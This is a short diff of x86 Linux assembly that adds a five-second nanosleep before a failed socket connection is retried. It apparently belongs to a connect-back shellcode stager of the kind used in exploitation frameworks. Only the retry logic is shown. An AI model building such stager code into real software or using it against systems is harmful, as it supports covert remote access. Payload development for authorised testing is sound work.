@@ -70,6 +70,15 @@ try_connect:
 	jns mprotect
 
 handle_failure:
+	push 0xa2
+	pop eax
+	push 0x0              ; sleep_nanoseconds
+	push 0x5              ; sleep_seconds
+	mov ebx, esp
+	xor ecx, ecx
+	int 0x80              ; sys_nanosleep
+	test eax, eax
+	js failed
 	dec esi
 	jnz create_socket
 	jmp failed
